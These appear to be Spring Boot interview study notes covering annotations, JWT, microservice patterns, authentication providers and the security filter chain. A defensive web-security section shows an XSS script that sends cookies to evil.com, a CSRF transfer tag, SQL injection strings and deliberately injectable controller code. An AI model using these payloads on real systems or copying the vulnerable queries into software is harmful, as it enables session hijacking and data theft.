| `spring-boot-starter-data-jpa` | Work with databases using JPA/Hibernate |
| `spring-boot-starter-security` | Add authentication and authorization    |
| `spring-boot-starter-test`     | Testing (JUnit, Mockito, Spring Test)   |
| `spring-boot-starter-actuator` | Monitoring and metrics endpoints        |



### @RETRYABLE

### @POST CONSTRUCT

The @PostConstruct annotation in Java is used to mark a method that should be executed after a bean has been fully constructed and its dependencies have been injected by a container or framework (like Spring).

Key characteristics and usage:-

Purpose:-
It serves as a callback method for initialization logic that requires the bean to be in a complete and ready state, including all its injected dependencies. This is distinct from the constructor, which runs before dependency injection.

Execution Timing:-
The method annotated with @PostConstruct is invoked exactly once during the bean's lifecycle, after its construction and all dependency injection has taken place, but before the bean is put into service.



### 📌 Key Points:-

Concept	Behavior
@PostConstruct	Called once after bean creation and injection
Timing	Before controller methods are invoked
Trigger	Automatically called by Spring (no manual call needed)
Purpose	Pre-load or set up the service after construction

### Conditional On Property

## ScanBasePackage
## Sending Data in Request

### Request Param/Query Param
### Path Param
### POJO
### ELK
E- Elasticsearch
L - Longstash
K - Kibana

## LOGGING

ERROR
WARN
INFO
DEBUG
TRACE

#### Logging for a file and logging results in a file in springboot application

## Change pattern of logs

### HTTP FILTER

### Tracing with Logging
MDC(Mapped Diagonsitic)

## Server Side Rendering and Client Side Rendering

### OAuth2.0 and JWT
In my project, I used OAuth 2.0 for authorization and JWT as the access token format.
The authorization server issues a JWT access token after successful authentication.
This token is sent with every API request, and our resource server validates the JWT locally using the public key, checking expiry and scopes before allowing access.”

### ✅ 1-Minute Answer (More Technical, Very Strong ⭐)

“We implemented OAuth 2.0 with JWT to secure our APIs.
The client application first authenticates via the authorization server, which issues a JWT-based access token.
The client then sends this token in the Authorization header when calling our backend services.
Each resource server validates the JWT signature using the authorization server’s public key and enforces access based on scopes and roles.
This approach gave us stateless authentication, scalability, and secure service-to-service communication.”

### Saga Pattern (In Very Simple Words)

Saga Pattern is a way to complete a big task by doing many small steps, and if any step fails, we undo the previous steps.
Online Shopping 🛒

1️⃣ You place an order
2️⃣ Money is deducted
3️⃣ Item is reserved in warehouse

Now imagine:
❌ Money deduction fails

What should happen?

Order should be cancelled

Item should be released

👉 That undo process is Saga Pattern

### 🔹 What is an API Gateway? (Very Simple)

API Gateway is a single entry point for all client requests in a microservices system.

Instead of calling many services directly, the client calls one gateway, and the gateway talks to the services.

Client → API Gateway → Microservices

### 🔹 What is Resilience4j? (Simple)

Resilience4j is a Java library that helps your application handle failures gracefully.

Instead of crashing or hanging, your service:

Fails fast

Recovers safely

Protects itself

🔹 Why do we need Resilience4j?

In microservices:

Network calls fail

Services go down

Responses get slow

Too many retries overload system

Resilience4j prevents cascading failures.


### How to use multiple Database in your project?
In our project, we used multiple databases by configuring separate datasources, entity managers, and transaction managers for each database.
Each service module had its own entities and repositories, ensuring clean separation and proper transaction handling.

### 🔹 What is CAP Theorem? (One line)

In a distributed system, you can guarantee only TWO out of these THREE: Consistency, Availability, and Partition Tolerance.

You cannot have all three at the same time.

####  🔹 What does CAP stand for?
1️⃣ Consistency (C)

Every user sees the same data at the same time.

Example:

You update your profile

Everyone sees the updated value immediately

2️⃣ Availability (A)

Every request gets a response, even if it’s not the latest data.

Example:

App always responds

Might return slightly old data

3️⃣ Partition Tolerance (P)

System continues to work even if network failure happens between nodes.

Example:

One server cannot talk to another

System still works

🔹 Why Partition Tolerance is mandatory?

In real distributed systems:

Network failures WILL happen

So P is not optional

👉 Real choice is between C vs A


### ✅ @PathVariable vs @RequestBody — WHEN & WHY TO USE ?

🔹 1. @PathVariable

Gets data from the URL path

##### Use @PathVariable when:

You are fetching / updating / deleting a specific resource

The value is mandatory

The data is simple (id, name, code)

Used to identify a resource

| Feature        | `@PathVariable`     | `@RequestBody`    |
| -------------- | ------------------- | ----------------- |
| Data source    | URL path            | Request body      |
| Data type      | Simple (id, string) | Complex object    |
| Mandatory      | Usually yes         | Optional/required |
| HTTP methods   | GET, DELETE         | POST, PUT         |
| JSON supported | ❌ No                | ✅ Yes             |
| Validation     | Limited             | Full (`@Valid`)   |
```

# ✅ When to Use HTTP POST Instead of GET

## 1️⃣ When You Are Creating New Data
- POST is used to create a new resource on the server.
- GET should never create or modify data.

**Example:** Creating a new user, order, payment, or record.

---

## 2️⃣ When the Request Changes Server State
- POST modifies data.
- GET must be read-only — GET requests should not cause side effects.

**Rule:** If server data changes → use POST.

---

## 3️⃣ When Sending Sensitive Data
- GET sends data in the URL.
  - URLs can be logged, cached, or stored in browser history.
- POST sends data in the request body, which is preferable for sensitive information.

**Example:** Passwords, tokens, personal details → POST.

---

## 4️⃣ When Sending Large or Complex Data
- GET has URL length limitations.
- POST supports large payloads, JSON, XML, and file uploads.

**Example:** Submitting forms with many fields, uploading files → POST.

---

## 5️⃣ When Data Structure Is Complex
- GET supports only simple key–value pairs (query strings).
- POST supports nested objects, arrays, and complex JSON.

**Example:** An order with items, addresses, and payment info → POST.

---

## 6️⃣ When Request Is Not Idempotent
- POST is not idempotent: calling it multiple times can create multiple records.
- GET is idempotent and safe for repeated calls.

**Example:** Calling “create order” twice → two orders (POST).

---

## 7️⃣ When You Don’t Want the Request to Be Cached
- GET requests can be cached by browsers and intermediaries.
- POST requests are not cached by default.

**Example:** Financial transactions, form submissions → POST.

---

## ❌ When NOT to Use POST
- For fetching data only.
- For searches or reads that do not modify server state.

👉 Use GET instead.
```


# Authentication Providers:-

### 1️⃣ In-Memory Authentication

### 🔹 What it is:
Users are stored directly in memory (inside application config).

### 🔹 Used for:

Demos

Learning

Very small apps

### 🔹 Example:
```
@Bean
public UserDetailsService userDetailsService() {
    UserDetails user = User.withUsername("admin")
            .password("{noop}admin123")
            .roles("ADMIN")
            .build();
    return new InMemoryUserDetailsManager(user);
}
```


⚠️ Not for production (data lost on restart)

### 2️⃣ JDBC Authentication
 
#### 🔹 What it is:
Users are stored in a relational database (MySQL, PostgreSQL, etc.).

#### 🔹 Used for:

Traditional applications

Enterprise systems

#### 🔹 How it works:
Spring Security queries users and authorities tables.

🔹 Example:
```
auth.jdbcAuthentication()
    .dataSource(dataSource);
```

✅ Persistent
❌ Less flexible than JPA

#### 3️⃣ DAO Authentication (Most Common ✅)

#### 🔹 What it is:
Uses UserDetailsService + PasswordEncoder.

#### 🔹 Used for:

Real-world Spring Boot applications

Microservices

#### 🔹 How it works:
Fetches user from DB using JPA/Hibernate.

🔹 Example:
```
@Service
public class CustomUserDetailsService implements UserDetailsService {
    @Override
    public UserDetails loadUserByUsername(String username) {
        return userRepository.findByUsername(username);
    }
}
```


✅ Highly flexible
✅ Production-ready
✅ Interview favorite

#### 4️⃣ LDAP Authentication

#### 🔹 What it is:
Authentication via LDAP / Active Directory.

🔹 Used for:

Corporate environments

Enterprise SSO

🔹 Example Use Case:
Employees logging in using company credentials.

#### 5️⃣ OAuth2 Authentication

#### 🔹 What it is:
Login via external identity providers.

🔹 Examples:

Google

GitHub

Facebook

🔹 Used for:

Social login

SSO

🔹 Spring Module:
spring-boot-starter-oauth2-client

✅ Secure
✅ No password handling by your app

#### 6️⃣ JWT Authentication (Stateless 🔥)

#### 🔹 What it is:
Token-based authentication using JWT.

#### 🔹 Used for:

REST APIs

Microservices

Mobile apps

🔹 Flow:

User logs in

Server generates JWT

Client sends JWT in headers

Authorization: Bearer <token>


✅ Stateless
✅ Scalable
❌ Token management required

#### 7️⃣ Pre-Authenticated Authentication

#### 🔹 What it is:
Authentication happens outside Spring Boot.

#### 🔹 Used for:

API gateways

Reverse proxies

#### 🔹 Example:
User already authenticated by gateway → Spring trusts it.

#### 8️⃣ Custom Authentication Provider

#### 🔹 What it is:
You write your own authentication logic.

🔹 Used for:

OTP login

Biometric login

External systems

🔹 Example:
```
public class CustomAuthProvider implements AuthenticationProvider {
    @Override
    public Authentication authenticate(Authentication auth) {
        // custom logic
    }
}
```

#### 🔁 How Spring Chooses the Provider

Spring Security uses:

AuthenticationManager
        ↓
AuthenticationProvider(s)
        ↓
UserDetailsService / External system

⭐ Interview Summary (One-Liner)

Spring Boot supports multiple authentication providers such as In-memory, JDBC, DAO, LDAP, OAuth2, JWT, Pre-Authenticated, and Custom providers, managed via Spring Security’s AuthenticationManager.


```

Client Request
      ↓
Authentication Filter
      ↓
AuthenticationManager
      ↓
UserDetailsService
      ↓
UserDetails

```


### What is UserDetails in Spring Boot?

In Spring Boot, UserDetails is a core interface of Spring Security.

👉 It represents one authenticated user in the Spring Security system.

In simple words:

UserDetails = Who the user is, what password they have, and what roles/authorities they own.


### What is JSON Back Reference ?

In Spring Boot, JSON Back Reference usually refers to the annotation:

@JsonBackReference

It is used to prevent infinite recursion while converting Java objects to JSON.

👉 It works together with:

@JsonManagedReference


Consider a bi-directional relationship in JPA:

One Parent has many Child

Each Child has a reference back to Parent

Example Relationship
Parent → Child → Parent → Child → ...


#### When Jackson tries to convert this to JSON:
👉 Infinite loop occurs
👉 Results in StackOverflowError

### @JsonBackReference is used to prevent infinite recursion in bi-directional relationships by ignoring the back reference during JSON serialization.



### 1️⃣ @PathVariable – identify the resource

Use it when the value is part of the URL and uniquely identifies something.

Example
GET /users/101
```
@GetMapping("/users/{id}")
public User getUser(@PathVariable Long id) {
    return service.getUser(id);
}
```

#### When to use

✅ Fetch / update / delete one specific resource
✅ Mandatory value
✅ REST-friendly

❌ Don’t use for optional or filter values

### 2️⃣ @RequestParam – filters, flags, small values

Use it for query parameters (after ? in URL).

Example
GET /users?role=admin&active=true
```
@GetMapping("/users")
public List<User> getUsers(
    @RequestParam String role,
    @RequestParam boolean active
) {
    return service.getUsers(role, active);
}
```
#### When to use

✅ Optional parameters
✅ Filters, sorting, pagination
✅ Small/simple data (String, int, boolean)

@RequestParam(required = false)
@RequestParam(defaultValue = "0")


❌ Not good for large JSON objects

### 3️⃣ @RequestBody – complex / structured data

Use when sending JSON/XML in request body.

Example
POST /users
```
{
  "name": "Priyanka",
  "email": "priyanka@gmail.com",
  "age": 25
}
```
```
@PostMapping("/users")
public User createUser(@RequestBody UserRequest request) {
    return service.createUser(request);
}
```

#### When to use

✅ Create / update operations
✅ Large or nested data
✅ DTO objects

❌ Not for GET requests (generally)

#### 🔥 Interview-friendly comparison table
### Situation	        ### Use
Get user by ID	      @PathVariable
Filter users	        @RequestParam
Create user	          @RequestBody
Update user	          @PathVariable + @RequestBody
Pagination	          @RequestParam
Search API	          @RequestBody (if complex)




## Spring WebFlux 
Spring WebFLUX is a reactive, non-blocking web framework built on Project Reactor. It uses Mono for 0–1 elements and Flux for 0–N elements. Unlike Spring MVC, it uses an event-loop model and non-blocking I/O, making it suitable for high concurrency and streaming applications.
Mono is a reactive Publisher in Project Reactor that emits zero or one element asynchronously. It supports various operators like map, flatMap, filter, onErrorResume, and zip to transform and control reactive data flow. It is lazy and executes only when subscribed.

## 🚀 What is Spring Boot?

Spring Boot is an opinionated framework built on top of Spring that helps build production-ready applications quickly with:

a) Minimal configuration

b) Embedded servers

c) Auto-configuration

d) Microservices support

✅ 1️⃣ Auto-Configuration
🔹 Feature

Spring Boot automatically configures beans based on:

Classpath dependencies

Properties

Conditions

Example:
If spring-boot-starter-data-jpa is present →
Spring auto-configures:

DataSource

EntityManager

TransactionManager

⚠ Pitfall

Hidden configurations → hard to debug

You may not know which bean is getting created

Can accidentally override config

Example issue:
Multiple DataSource beans → ambiguity

👉 Solution:

Use @ConditionalOn...

Use spring.autoconfigure.exclude

Enable debug logs

✅ 2️⃣ Embedded Server (Tomcat/Jetty/Netty)
🔹 Feature

No need for external server deployment.

mvn spring-boot:run

App runs with embedded Tomcat.

⚠ Pitfall

Memory overhead in microservices

Too many services → too many embedded servers

Can increase startup time

In high-scale systems → consider container tuning.

✅ 3️⃣ Starter Dependencies
🔹 Feature
spring-boot-starter-web
spring-boot-starter-data-jpa
spring-boot-starter-security

Pre-configured dependencies.

⚠ Pitfall

Pulls many transitive dependencies

Can increase jar size

Version conflicts sometimes hidden

👉 Always check:

mvn dependency:tree
✅ 4️⃣ Production-Ready Features (Actuator)
🔹 Feature

Spring Boot Actuator provides:

Health checks

Metrics

Prometheus integration

Thread dump

Environment details

⚠ Pitfall

If not secured:

/actuator/env exposes secrets

/actuator/heapdump exposes memory

👉 Always:

Secure actuator endpoints

Restrict exposure

✅ 5️⃣ Configuration Management
🔹 Feature

Supports:

application.properties

application.yml

Profiles

Environment variables

Example:

spring.profiles.active=prod
⚠ Pitfall

Misconfigured profiles in prod

Hardcoded values

Secrets in properties file

👉 Use:

Vault

AWS Secrets Manager

Environment variables

✅ 6️⃣ Dependency Injection (IoC)
🔹 Feature

@Component

@Service

@Repository

@Autowired

⚠ Pitfall

Field injection (hard to test)

Circular dependencies

Large God services

👉 Best Practice:

Constructor injection

Follow SOLID (you already focus on this 👍)

✅ 7️⃣ Spring Boot + Microservices Support
🔹 Feature

Works well with:

Kafka

RabbitMQ

REST

WebFlux

Spring Cloud

⚠ Pitfall

Distributed transaction issues

Overuse of synchronous REST calls

Too many inter-service calls → latency

👉 Prefer:

Event-driven architecture

Saga pattern

✅ 8️⃣ Transaction Management
🔹 Feature
@Transactional

Easy transaction handling.

⚠ Pitfall

Only works for public methods

Doesn’t work on internal method calls

Proxy-based limitation

Very common interview trap 🔥

✅ 9️⃣ Spring Boot + JPA
🔹 Feature

Very fast CRUD development.

⚠ Pitfalls

N+1 query problem

LazyInitializationException

Blocking DB driver (not reactive)

In high-throughput systems → careful optimization needed.

✅ 10️⃣ Logging & Monitoring
🔹 Feature

Default logging via Logback.

⚠ Pitfall

Excessive logging → performance impact

Logging sensitive data


## What is a CSRF Attack?

A CSRF (Cross-Site Request Forgery) attack is when a malicious website tricks a user’s browser into making an unwanted request to another website where the user is already logged in.

👉 The attack works because the browser automatically sends cookies (like session cookies) with every request.

## Imagine:

You log in to your bank → bank.com

Your browser stores a session cookie

Without logging out, you visit a malicious site → evil.com

That site secretly runs this:

**<img src="https://bank.com/transfer?to=attacker&amount=10000" />**

Since you're logged in, your browser automatically sends the session cookie to bank.com.

💥 The bank thinks YOU requested the transfer.

That is CSRF.

**🔥 Why It Happens** 

Because:

Browser automatically sends cookies

Server trusts the cookie

No extra validation is done


## 🛡️ How to Prevent CSRF
**1️⃣ CSRF Token (Most Common Solution)**

Server generates a random token and sends it in a form.

<input type="hidden" name="_csrf" value="abc123xyz">

When form is submitted:

Server checks if token matches

If not → request rejected

👉 This is what Spring Security does by default.

**2️⃣ SameSite Cookies**

Set cookie like:

Set-Cookie: JSESSIONID=xyz; SameSite=Strict

Prevents browser from sending cookie in cross-site requests.

**3️⃣ Double Submit Cookie Pattern**

Send token in:

Cookie

Request body/header

Server compares both.

**4️⃣ Use JWT in Authorization Header**

Instead of cookies:

Authorization: Bearer token

Browser does NOT auto-send this.
So CSRF becomes very hard.

## 💡 How Spring Boot Handles CSRF

If you're using:

**@EnableWebSecurity**

Spring Security:

Automatically enables CSRF protection

Adds _csrf token in forms

Rejects unsafe POST/PUT/DELETE without token

To disable (not recommended for forms):

**http.csrf().disable();**

👉 Usually disabled in stateless REST APIs using JWT.

## 🔥 What is an XSS Attack?

XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious JavaScript into a trusted website, and that script runs in other users’ browsers.

👉 Unlike CSRF (which sends requests), XSS can read data, steal cookies, and fully act as the user.


## 🧠 Simple Example

Imagine your app has a comment box:
```
<div>
  User comment: {{comment}}
</div>
```

If the app does NOT escape input, the attacker submits:
```
<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
```

Now whenever someone views that page:

💥 The script runs
💥 Their cookies are sent to attacker
💥 Attacker can hijack session

## 🛡️ How to Prevent XSS
1️⃣ Escape Output (MOST IMPORTANT)

Instead of:

<div>${userInput}</div>

Use escaping:

<div th:text="${userInput}"></div>

In Spring + Thymeleaf:

th:text escapes automatically

th:utext does NOT escape

2️⃣ Use HttpOnly Cookies
Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure

Prevents JS from reading cookies.

3️⃣ Content Security Policy (CSP)
Content-Security-Policy: script-src 'self'

Prevents inline scripts.

4️⃣ Validate & Sanitize Input

Reject <script>

Remove HTML tags

Use libraries like OWASP sanitizer

🧠 Real Attack Example in Spring Boot

Bad controller:
```
@GetMapping("/hello")
public String hello(@RequestParam String name) {
    return "<h1>Hello " + name + "</h1>";
}
```

If user visits:

/hello?name=<script>alert(1)</script>

Boom 💥

Better approach:

Use template engine

Never build HTML using string concatenation

🔥 How To Protect From XSS Attacks

There is no single fix.
You need multiple layers of protection.

🛡️ 1️⃣ Escape Output (MOST IMPORTANT)
👉 Golden Rule:

Always escape data when rendering it into HTML.

✅ In Spring Boot (Thymeleaf)

Safe:

<p th:text="${comment}"></p>

❌ Dangerous:

<p th:utext="${comment}"></p>

th:text escapes automatically.
th:utext renders raw HTML.

✅ In React (Safe by Default)
<div>{userInput}</div>

React automatically escapes content.

❌ Dangerous:

<div dangerouslySetInnerHTML={{__html: userInput}} />

Never use this with user input.

🛡️ 2️⃣ Use HttpOnly Cookies

If attacker somehow injects script:

document.cookie

They should NOT be able to read session cookie.

Set cookie like:

Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax

HttpOnly → JS cannot read cookie

Secure → HTTPS only

SameSite → Prevent CSRF

In Spring Boot:

server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true
🛡️ 3️⃣ Use Content Security Policy (CSP)

CSP tells browser:

"Only allow scripts from my domain"

Example:

Content-Security-Policy: script-src 'self'

In Spring Boot:

http.headers()
    .contentSecurityPolicy("script-src 'self'");

This blocks inline <script> injection.

🛡️ 4️⃣ Validate & Sanitize Input

If your app allows HTML (like rich text editor):

Use sanitizer libraries like:

OWASP Java HTML Sanitizer

Jsoup clean()

Example:

String clean = Jsoup.clean(userInput, Safelist.basic());

Removes <script> and dangerous tags.

🛡️ 5️⃣ Never Build HTML Using String Concatenation

❌ Bad:

return "<h1>" + userInput + "</h1>";

Use:

Template engine

JSON APIs instead of server-rendered HTML

🛡️ 6️⃣ Avoid Inline JavaScript

Bad:

<button onclick="doSomething()">

Better:

element.addEventListener("click", handler)

Helps CSP enforcement.

🛡️ 7️⃣ Keep Dependencies Updated

Old libraries sometimes allow DOM-based XSS.

Since you're working in microservices:

Keep Spring Boot updated

Keep frontend framework updated
## 👉 CORS 

CORS itself is not an attack.
CORS is a browser security mechanism.

But ❗ misconfigured CORS can create security vulnerabilities.

Let’s break this clearly.

## 🌍 What is CORS?

CORS = Cross-Origin Resource Sharing

It controls:

Which frontend (origin) is allowed to call your backend API.

## 🧠 What is an Origin?

An origin is:

Protocol + Domain + Port

Example:

URL	Origin
https://app.com
	https://app.com

https://app.com:8080
	https://app.com:8080

http://app.com
	http://app.com

Even changing port makes it different origin.

🔐 Why CORS Exists

Browsers block JavaScript from calling another domain by default.

Example:

Frontend:

https://myapp.com

Backend:

https://api.bank.com

Browser blocks request unless backend allows it.

## ⚠️ What is a “CORS Attack”?

It’s not exactly an attack.

It usually means:

Backend is configured to allow ANY origin to access protected APIs.

Example of dangerous config:

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

This is very dangerous.

🔥 Dangerous Scenario

Let’s say:

You are logged into:

https://bank.com

Your session cookie exists.

Now you visit:

https://evil.com

If bank backend allows:

Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

Then evil.com can do:

fetch("https://bank.com/account", {
  credentials: "include"
})

Now:

Browser sends session cookie

Evil site can READ the response

Attacker gets your account data

💥 That is a serious vulnerability.

## 🚨 Important Difference
CSRF	CORS Misconfiguration
Sends request	Sends + READS response
Cannot read data	Can read data
Uses cookies auto	Needs backend misconfig
## 🔎 How Browser CORS Flow Works

When frontend calls backend:

1️⃣ Browser sends preflight request
OPTIONS /api/data
Origin: https://myapp.com
2️⃣ Backend responds
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST

If allowed → browser sends real request.

If not → blocked.

## 🛡️ How To Secure CORS in Spring Boot
❌ NEVER DO THIS
.allowedOrigins("*")
.allowCredentials(true)

Very dangerous.

✅ Correct Way

Specify exact frontend:
```
@Configuration
public class CorsConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                        .allowedOrigins("https://myfrontend.com")
                        .allowedMethods("GET","POST","PUT","DELETE")
                        .allowCredentials(true);
            }
        };
    }
}
```
## 🎯 For Your Microservices + JWT Setup

If you're using:

Authorization: Bearer token

And token is stored in:

HttpOnly cookie → CORS matters

localStorage → CORS still matters

Always:

Allow only trusted frontend domains

Never use "*"

Avoid allowCredentials(true) with "*"

🧠 Important Understanding

CORS is:

A browser protection

Not backend protection

Not API-level authentication

Tools like Postman ignore CORS.

Only browsers enforce it.

🔥 Real Interview Answer

If interviewer asks:

What is CORS and how can misconfiguration cause issues?

You say:

CORS controls cross-origin requests

It is enforced by browsers

If backend allows * with credentials, malicious sites can read authenticated responses

Always restrict allowed origins explicitly

## 💣 What is SQL Injection?

SQL Injection (SQLi) happens when an attacker injects malicious SQL code into your query through user input.

👉 If your application builds SQL queries using string concatenation, attackers can modify the query logic.

🧠 Simple Example

Imagine login code like this:
```
String query = "SELECT * FROM users WHERE username = '" 
               + username + 
               "' AND password = '" 
               + password + "'";
```

Now attacker enters:

username: admin
password: ' OR '1'='1

Query becomes:

SELECT * FROM users 
WHERE username = 'admin' 
AND password = '' OR '1'='1'

Since '1'='1' is always true → login bypassed 💥

## 🔥 What Can Attackers Do?

If vulnerable, attacker can:

Bypass login

Read all user data

Delete tables

Modify records

Dump entire database

Worst case:

DROP TABLE users;
🎯 Types of SQL Injection
1️⃣ Authentication Bypass
' OR '1'='1
2️⃣ Data Extraction (Union Based)
' UNION SELECT credit_card FROM users --

Used to extract sensitive data.

3️⃣ Blind SQL Injection

When app doesn't show errors.

Attacker checks:

' AND 1=1 --
' AND 1=2 --

And observes response behavior.

🚨 Why It Happens

Because of:

❌ String concatenation
❌ Direct query building
❌ No parameter binding

🛡️ How To Prevent SQL Injection

This is VERY important for you.

✅ 1️⃣ Use Prepared Statements (Most Important)

Never build queries like this:

String query = "SELECT * FROM users WHERE id=" + userId;

Instead use:

PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM users WHERE id=?"
);
stmt.setInt(1, userId);

The database treats input as data, not SQL.

✅ 2️⃣ If Using Spring Boot + JPA (Best for You)

Safe:

@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

Or even better:

User findByUsername(String username);

Spring Data automatically uses prepared statements.

❌ Dangerous in Spring
entityManager.createQuery(
   "SELECT u FROM User u WHERE u.name = '" + name + "'"
);

Never concatenate JPQL either.

✅ 3️⃣ Validate Input

For example:

ID should be numeric

Email should match regex

But remember:
Validation is NOT replacement for prepared statements.

✅ 4️⃣ Use Least Privilege DB User

Your app DB user should NOT have:

DROP TABLE permission

ALTER permission

🔥 Real Example in Spring Boot

Bad Controller:

@GetMapping("/user")
public List<User> getUser(@RequestParam String name) {
    return entityManager.createNativeQuery(
        "SELECT * FROM users WHERE name = '" + name + "'"
    ).getResultList();
}

Attacker sends:

/user?name=' OR '1'='1

Boom 💥

🧠 SQL Injection vs XSS vs CSRF
Attack	Target	Happens Where
SQL Injection	Database	Backend
XSS	Browser	Frontend
CSRF	Authenticated Request	Browser + Backend



## How do you prevent SQL Injection in Spring Boot?

You say:

Use prepared statements

Use Spring Data JPA repositories

Never concatenate SQL

Validate inputs

Use least privilege DB access

🚀 Since You Work with Microservices

In your architecture:

Service → DB

API Gateway → Service

UI → Gateway

SQL injection happens inside:
👉 Service layer when querying DB

Even if you have:

JWT

OAuth

API Gateway

SQL injection is still possible if query is badly written.

🔥 Most Important Rule

Never trust user input. Always parameterize queries.

If you want, next I can explain:

🛡️ PART 2 — How Prepared Statements Stop This

Now let’s see internal difference.

Instead of:

"SELECT * FROM users WHERE username='" + username + "'"

We do:

PreparedStatement ps = connection.prepareStatement(
   "SELECT * FROM users WHERE username=? AND password=?"
);
🧠 What Happens Internally
Step 1 — SQL is Sent to DB FIRST

DB receives:

SELECT * FROM users WHERE username=? AND password=?

DB parses and creates execution plan.

Notice:

It does NOT see user input yet.

Step 2 — Parameters Sent Separately

Now JDBC sends:

Parameter 1 → "admin"
Parameter 2 → "' OR '1'='1"

These values are transmitted as DATA, not SQL.

Step 3 — DB Treats Parameters as Literals

Even if attacker input is:

' OR '1'='1

DB treats it as:

password = "' OR '1'='1"

NOT as:

password='' OR '1'='1'

So injection fails.

🎯 Why This Works

Because SQL parsing and execution plan creation happen BEFORE parameters are added.

The structure of query is fixed.

User input cannot change SQL structure.

🔥 PART 3 — How JPA Prevents SQL Injection Internally

Since you're using Spring Boot + JPA, this is important.

✅ Case 1 — Derived Query Method
User findByUsername(String username);

Spring Data converts this into:

SELECT * FROM users WHERE username=?

It internally uses PreparedStatement.

✅ Case 2 — JPQL with Named Parameters
@Query("SELECT u FROM User u WHERE u.username = :username")
User find(@Param("username") String username);

JPA converts to:

SELECT * FROM users WHERE username=?

Again → parameter binding → safe.

🚨 Dangerous Case in JPA

If you do:

entityManager.createQuery(
   "SELECT u FROM User u WHERE u.name = '" + name + "'"
);

You bypass JPA protection.

Now injection possible.

🧠 Internally What JPA Does

Flow:

Spring Data → Hibernate → JDBC → PreparedStatement → DB

Hibernate:

Parses JPQL

Converts to SQL

Replaces named parameters with ?

Uses PreparedStatement

Binds values safely

So structure is frozen before data is inserted.


## 🔥 What Are Filters in Spring Boot?

A Filter is a component that:

Intercepts every HTTP request and/or response before it reaches your controller.

Think of it like:
```
Client → Filter → Controller → Service → DB
```

And on response:
```
DB → Service → Controller → Filter → Client
```
## 🧠 Simple Real-Life Analogy

Filter = Security guard at office gate.

Every request must pass through guard.

Guard checks ID (authentication).

Then allows entry.

📌 Where Do Filters Exist?

Filters are part of:

👉 Servlet API (javax.servlet / jakarta.servlet)
Spring Boot builds on top of this.

## 🔄 Request Flow in Spring Boot
Client Request
      ↓
Servlet Container (Tomcat)
      ↓
Filter
      ↓
DispatcherServlet
      ↓
Controller
🛠️ Why We Use Filters?

## Common use cases:

Use Case	Example
Authentication	Check JWT
Logging	Log request details
CORS	Add CORS headers
Rate limiting	Block too many requests
Request modification	Add headers

##  ASCII FULL FLOW DIAGRAM (Complete End-to-End)
                  ┌──────────────────────────┐
                  │      CLIENT (Browser)     │
                  └──────────────┬───────────┘
                                 │
                                 ▼
                  ┌──────────────────────────┐
                  │      TOMCAT SERVER        │
                  └──────────────┬───────────┘
                                 │
                                 ▼
          ┌──────────────────────────────────────────────┐
          │        SERVLET FILTER CHAIN (Tomcat)         │
          │  - CORS Filter                               │
          │  - Encoding Filter                            │
          │  - springSecurityFilterChain  (IMPORTANT)     │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────────────────────┐
          │      DelegatingFilterProxy ("ssfc")          │
          │        delegates to FilterChainProxy         │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────────────────────┐
          │           FilterChainProxy                    │
          │   (Selects matching SecurityFilterChain)      │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
   ┌──────────────────────────────────────────────────────────┐
   │            SECURITY FILTER CHAIN (SPRING)                │
   │----------------------------------------------------------│
   │  1. SecurityContextPersistenceFilter                      │
   │  2. LogoutFilter                                          │
   │  3. UsernamePasswordAuthenticationFilter (LOGIN)          │
   │        │                                                  │
   │        │ Calls AuthenticationManager → ProviderManager    │
   │        ▼                                                  │
   │      ┌─────────────────────────────────────────────┐     │
   │      │           AUTHENTICATION MANAGER            │     │
   │      └──────────────┬──────────────────────────────┘     │
   │                     ▼                                    │
   │      ┌─────────────────────────────────────────────┐     │
   │      │           PROVIDER MANAGER                  │     │
   │      │  (calls multiple AuthenticationProviders)   │     │
   │      └──────┬───────────────────┬──────────────────┘     │
   │             │                   │                        │
   │             ▼                   ▼                        │
   │   DaoAuthenticationProvider   JwtAuthenticationProvider   │
   │   (username/password)         (JWT validation)            │
   │             │                   │                        │
   │             └───────► returns Authentication  ◄──────────┘
   │
   │  4. BasicAuthenticationFilter
   │  5. JwtAuthenticationFilter (if JWT)
   │  6. ExceptionTranslationFilter
   │  7. FilterSecurityInterceptor (Authorization)
   └──────────────────────────────────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────────────────────┐
          │              DISPATCHERSERVLET               │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────────────────────┐
          │             HANDLER MAPPING                  │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────────────────────┐
          │               INTERCEPTORS                   │
          │     - preHandle()                            │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
          ┌──────────────────────────────────────────────┐
          │              CONTROLLER METHOD                │
          └──────────────┬───────────────────────────────┘
                         │
                         ▼
       ┌──────────────────────────────────────────────────────────┐
       │                SERVICE LAYER (Business Logic)             │
       └──────────────┬───────────────────────────────────────────┘
                      │
                      ▼
       ┌──────────────────────────────────────────────────────────┐
       │                 REPOSITORY / DAO                          │
       └──────────────┬───────────────────────────────────────────┘
                      │
                      ▼
               Database (MySQL, Postgres…)

──────────────────────── RESPONSE PATH (BACK) ───────────────────────

Database → Repository → Service → Controller →  
Interceptors (postHandle) → DispatcherServlet →  
Security Filters (cleanup) → Servlet Filters → Tomcat → Client

## ✅ 2. Markdown Summary (Clean Explanation)
🔵 Phase 1: Tomcat & Servlet Filters
Tomcat receives request
Passes through Servlet Filter Chain
Important part: springSecurityFilterChain (DelegatingFilterProxy)
🟢 Phase 2: Spring Security (FilterChainProxy)
Delegates to the Security Filter Chain, which includes:
